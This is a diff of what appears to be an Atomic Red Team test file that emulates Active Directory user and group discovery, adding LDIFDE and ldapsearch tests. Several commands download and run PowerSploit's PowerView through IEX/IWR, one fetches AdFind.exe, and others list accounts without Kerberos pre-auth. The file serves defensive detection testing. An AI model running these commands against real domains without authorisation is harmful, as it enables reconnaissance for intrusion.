@@ -25,7 +25,7 @@ atomic_tests:
   input_arguments:
     user:
       description: User to identify what groups a user is a member of
-      type: String
+      type: string
       default: administrator
   executor:
     command: |
@@ -76,10 +76,10 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: hostname of the computer to analyze
-      type: Path
+      type: path
       default: $env:COMPUTERNAME
   executor:
-    command: | 
+    command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
     name: powershell
@@ -88,7 +88,7 @@ atomic_tests:
   description: |
     When successful, accounts that do not require kerberos pre-auth will be returned
   supported_platforms:
-    - windows
+  - windows
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -110,28 +110,24 @@ atomic_tests:
       get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
 - name: Adfind - Query Active Directory Groups
   auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
-  description: | 
+  description: |
     Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
     reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   supported_platforms:
   - windows
-  input_arguments:
-    adfind_path:
-      description: Path to the AdFind executable
-      type: Path
-      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AdFind.exe must exist on disk at specified location (#{adfind_path})
+      AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
     prereq_command: |
-      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+      if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe) {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
+      New-Item -Type Directory (split-path PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
   executor:
     command: |
-      #{adfind_path} -f (objectcategory=group)
+      PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe -f (objectcategory=group)
     name: command_prompt
 - name: Enumerate Active Directory Groups with Get-AdGroup
   auto_generated_guid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
@@ -164,7 +160,7 @@ atomic_tests:
     When successful, accounts that do not require kerberos pre-auth will be returned.
     Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
   supported_platforms:
-    - windows
+  - windows
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -194,7 +190,7 @@ atomic_tests:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
-    name: powershell 
+    name: powershell
 - name: Get-DomainGroup with PowerView
   auto_generated_guid: 5a8a181c-2c8e-478d-a943-549305a01230
   description: |
@@ -205,4 +201,81 @@ atomic_tests:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
-    name: powershell 
+    name: powershell
+- name: Active Directory Enumeration with LDIFDE
+  auto_generated_guid: 22cf8cb9-adb1-4e8c-80ca-7c723dfc8784
+  description: |
+    Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.
+    The test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_path:
+      description: Path to the file that ldifde will output
+      type: path
+      default: C:\Windows\temp
+    output_file:
+      description: The filename to be created by ldifde
+      type: string
+      default: atomic_ldifde.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      PowerShell ActiveDirectory Module must be installed
+    prereq_command: |
+      Try {
+          Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
+          exit 0
+      }
+      Catch {
+          exit 1
+      }
+    get_prereq_command: |
+      if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+        Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+      } else {
+        Install-WindowsFeature RSAT-AD-PowerShell
+      }
+  executor:
+    elevation_required: true
+    command: |
+      ldifde.exe -f #{output_path}\#{output_file} -p subtree
+    cleanup_command: |
+      del #{output_path}\#{output_file}
+    name: command_prompt
+- name: Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS
+  auto_generated_guid: d58d749c-4450-4975-a9e9-8b1d562755c2
+  description: |
+    Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory
+  supported_platforms:
+  - linux
+  input_arguments:
+    domain:
+      description: The domain to be tested
+      type: string
+      default: example
+    top_level_domain:
+      description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)
+      type: string
+      default: com
+    user:
+      description: username@domain of a user
+      type: string
+      default: user@example.com
+    password:
+      description: password of the user referenced inside user
+      type: string
+      default: s3CurePssw0rD!
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch
+    prereq_command: |
+      which ldapsearch
+    get_prereq_command: |
+      echo missing ldapsearch command; exit 1
+  executor:
+    elevation_required: false
+    command: |
+      ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" "(objectClass=group)" -s sub -a always -z 1000 dn 
+    name: sh
